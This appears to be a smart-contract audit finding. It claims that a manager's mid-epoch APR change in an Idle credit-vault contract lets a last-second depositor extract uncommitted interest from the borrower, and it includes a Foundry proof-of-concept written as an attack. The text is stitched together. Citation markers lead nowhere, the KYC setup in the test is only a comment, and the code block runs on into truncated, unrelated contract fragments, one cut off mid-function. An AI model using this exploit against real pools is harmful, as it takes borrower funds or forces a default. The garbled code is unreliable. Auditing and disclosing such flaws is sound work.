### Title
Mid-epoch APR updates let depositors lock uncommitted interest - ([File: contracts/IdleCDOEpochVariant.sol](contracts/IdleCDOEpochVariant.sol))

### Summary
`IdleCreditVault.setApr()` and `setAprsWithBuffer()` can be called by the manager while an epoch is already running because neither function checks `isEpochRunning`. `depositDuringEpoch()` then prices new deposits using the mutated `lastApr`, adds the newly calculated interest to `expectedEpochInterest`, and sends the deposited principal to the borrower. An unprivileged KYC-passed depositor can therefore monitor a legitimate APR increase and deposit just before `epochEndDate`, receiving interest for the remaining epoch plus the complete buffer period even though the borrower did not owe interest on that principal for the preceding epoch. [1](#0-0) [2](#0-1) 

### Finding Description
The epoch interest invariant is established in `startEpoch()`: active NAV is measured once and `expectedEpochInterest` is fixed from the then-current strategy APR. However, `IdleCreditVault` exposes `setApr()`/`setAprsWithBuffer()` to the manager without an epoch-phase guard, so `lastApr` can be changed after that commitment has already been calculated. [3](#0-2) [1](#0-0) 

When mid-epoch deposits are enabled, `depositDuringEpoch()` reads the mutated APR through `_calcInterest()`, multiplies the resulting full-period interest by `(remaining + bufferPeriod) / (epochDuration + bufferPeriod)`, mints shares that include both principal and projected interest, and adds the full projected amount to `expectedEpochInterest`. [4](#0-3) [5](#0-4) 

At `stopEpoch()`, the CDO treats `expectedEpochInterest` as borrower-owed yield and attempts to pull it from the borrower. Consequently, the attacker’s last-moment deposit receives yield funded by the borrower or, if the borrower cannot fund the inflated amount, pushes the pool into default. [6](#0-5) [7](#0-6) 

### Impact Explanation
The attacker can convert a principal transfer made seconds before `epochEndDate` into interest covering the remaining epoch and the entire buffer period. For a 30-day epoch, 5-day buffer, and the default 20% maximum APR, a deposit made one second before expiry receives approximately `P * 20% * 5 days / 365 days`, or about 0.274% of principal before fee effects; a 100 million-unit deposit therefore creates approximately 274,000 units of additional borrower debt. [4](#0-3) [8](#0-7) 

This is direct extraction of yield that was not part of the borrower’s original epoch commitment. If the borrower does not fund the increased liability, `getFundsFromBorrower()` fails and `_handleBorrowerDefault()` pauses the pool and disables withdrawal requests. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
The attack requires `isDepositDuringEpochDisabled == false`, a running epoch, and a legitimate manager APR update before expiry. The APR setter does not require the epoch to be stopped, so an attacker can monitor the mempool or react after the transaction and deposit while `block.timestamp < epochEndDate`. [11](#0-10) [12](#0-11) [13](#0-12) 

The existing checks only validate the tranche, deposit flag, KYC status, nonzero tranche supply, and epoch timing; none compares the APR used for the deposit against the APR snapshotted when `expectedEpochInterest` was originally calculated. [14](#0-13) 

### Recommendation
Freeze the effective APR for the duration of an epoch. Store `epochApr` in `startEpoch()` and make `_calcInterest()` use that immutable value until `stopEpoch()` commits the next rate, or alternatively reject `setApr()`, `setAprs()`, and `setAprsWithBuffer()` while `isEpochRunning` is true. The latter is the smaller change, but the former preserves the ability to stage the next epoch’s rate without allowing it to affect current deposits. [3](#0-2) [15](#0-14) 

### Proof of Concept
The following Foundry test uses the existing `IdleCreditVault.t.sol` fixture conventions and demonstrates the accounting commitment. A mainnet or local fork deployment with `depositDuringEpoch` enabled behaves the same way.

```solidity
// test/foundry/IdleCreditVault.t.sol
function testMidEpochAprIncreaseLocksUncommittedInterest() external {
    uint256 seed = 1_000_000 * ONE_SCALE;
    uint256 attackPrincipal = 100_000_000 * ONE_SCALE;
    address attacker = makeAddr("attacker");

    // Existing tranche supply is required for depositDuringEpoch.
    idleCDO.depositAA(seed);
    _transferBurnedTrancheTokens(address(this), true);

    // Configure and start a 30-day epoch with a 5-day buffer.
    vm.prank(manager);
    cdoEpoch.setEpochParams(30 days, 5 days);
    vm.prank(owner);
    cdoEpoch.setIsDepositDuringEpochDisabled(false);
    vm.prank(manager);
    cdoEpoch.startEpoch();

    uint256 expectedBefore = cdoEpoch.expectedEpochInterest();

    // A routine manager APR change is allowed during the live epoch.
    // The attacker observes it and enters one second before expiry.
    uint256 newUnscaledApr = 20e18;
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprsWithBuffer(
        newUnscaledApr,
        30 days,
        5 days
    );

    vm.warp(cdoEpoch.epochEndDate() - 1);
    deal(defaultUnderlying, attacker, attackPrincipal);

    // Mark `attacker` as KYC-passed using the fixture's Keyring helper/mock.
    vm.startPrank(attacker);
    IERC20(defaultUnderlying).approve(address(idleCDO), attackPrincipal);
    uint256 minted = cdoEpoch.depositDuringEpoch(
        attackPrincipal,
        address(AAtranche)
    );
    vm.stopPrank();

    uint256 scaledApr = IdleCreditVault(address(strategy)).getApr();
    uint256 attackerInterest =
        attackPrincipal *
        (scaledApr / 100) *
        (1 + 5 days) /
        (365 days * ONE_TRANCHE_TOKEN);

    assertGt(minted, 0);
    assertApproxEqAbs(
        cdoEpoch.expectedEpochInterest() - expectedBefore,
        attackerInterest,
        2
    );

    // The borrower funds the inflated stopEpoch liability plus principal.
    vm.warp(cdoEpoch.epochEndDate());
    uint256 owed = IdleCreditVault(address(strategy)).balanceOf(address(cdoEpoch)) +
        cdoEpoch.expectedEpochInterest();
    deal(defaultUnderlying, borrower, owed);
    vm.prank(borrower);
    IERC20(defaultUnderlying).approve(address(cdoEpoch), owed);

    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 1); // close the pool and recall all funds

    // In closed-pool mode the attacker can open and claim a funded receipt.
    vm.startPrank(attacker);
    cdoEpoch.requestWithdraw(0, address(AAtranche));
    uint256 before = IERC20(defaultUnderlying).balanceOf(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 received = IERC20(defaultUnderlying).balanceOf(attacker) - before;
    vm.stopPrank();

    assertGt(received, attackPrincipal);
}

  function _handleBorrowerDefault(uint256 funds) internal {
    defaulted = true;

    // successful full funding is the only path that enables them before finalization.

    if (isProgrammableBorrower) {

  function depositDuringEpoch(uint256 _amount, address _tranche) external virtual returns (uint256 _minted) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == BBTranche && !isBBDepositEnabled) ||
      isDepositDuringEpochDisabled ||
      skipDefaultCheck ||
      // programmable borrowers use APR=0 so mid-epoch deposits would dilute existing depositors
      isProgrammableBorrower ||
      // check if AYS is active as we don't support deposits during epoch in that case
      isAYSActive ||
      // check if epoch is still running even if not manually stopped yet
      !isEpochRunning || block.timestamp >= epochEndDate ||
      !isWalletAllowed(msg.sender)
    );

    if (_amount == 0) {
      return _minted;
    }

    uint256 _trancheTotSupply = _trancheSupply(_tranche);
    // Avoid pricing discontinuities for the first mid-epoch deposit in a tranche
    _checkNotAllowed(_trancheTotSupply == 0);

    _skimDonatedAssets();
    // Check that limit is not exceeded after removing skimmable raw donations.
    _guarded(_amount);
    _updateAccounting();

    // Get underlyings from user
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);

    // interest for the remaining epoch plus the full buffer period
    // NOTE: _calcInterest already gives full‑epoch + full‑buffer interest for the whole epoch
    //   So when a user joins mid‑epoch, we take the fraction of that full‑period interest 
    //   that matches the time they actually remain plus the entire buffer
    uint256 buffer = bufferPeriod;
    uint256 remaining = epochEndDate - block.timestamp;
    uint256 interest = _calcInterest(_amount) *
      // the time the depositor actually participates (remaining epoch + full buffer)
      (remaining + buffer) /
      // the total time baked into the scaled APR (epoch + buffer).
      (epochDuration + buffer);

    uint256 expectedInt = expectedEpochInterest;
    uint256 pendingFees = pendingWithdrawFees;
    uint256 trancheExpected;
    // existing holders' share of net expected interest for the epoch (pre-deposit)
    // (exclude pendingWithdrawFees since they go to fee receivers, not tranche holders)
    if (expectedInt > pendingFees) {
      trancheExpected = _calcTrancheInterestShare(
        _netGainAfterFees(expectedInt - pendingFees, _calculateManagementFee(lastNAVAA + lastNAVBB, remaining)),
        _tranche
      );
    }
    // interest this deposit will earn for the tranche over the remaining time (net of fees)
    uint256 trancheInterest = _calcTrancheInterestShare(
      _netGainAfterFees(interest, _calculateManagementFee(_amount, remaining)),
      _tranche
    );
    // pre-deposit expected final NAV for existing holders.
    // This won't ever be zero as we checked _trancheTotSupply and we seed initial NAV at tranche creation
    uint256 expectedFinal = _lastSavedNAV(_tranche) + trancheExpected;

    // mint at a discounted price so depositor gets principal + its prorated interest at epoch end
    // A mid‑epoch depositor should get _amount + trancheInterest at epoch end.
    // So they need minted = (amount + trancheInterest) / priceEnd.
    // priceEnd = expectedFinal / _trancheTotSupply
    // so minted = (amount + trancheInterest) * _trancheTotSupply / expectedFinal
    _minted = (_amount + trancheInterest) * _trancheTotSupply / expectedFinal;
    _mintShares(_tranche, msg.sender, _minted, _amount);

    // update expected epoch interest
    expectedEpochInterest += interest;
    // mint strategy tokens to this contract
    IdleCreditVault(strategy).mintStrategyTokens(_amount);
    // transfer underlyings to the borrower
    _transferUnderlyings(_borrower(), _amount);
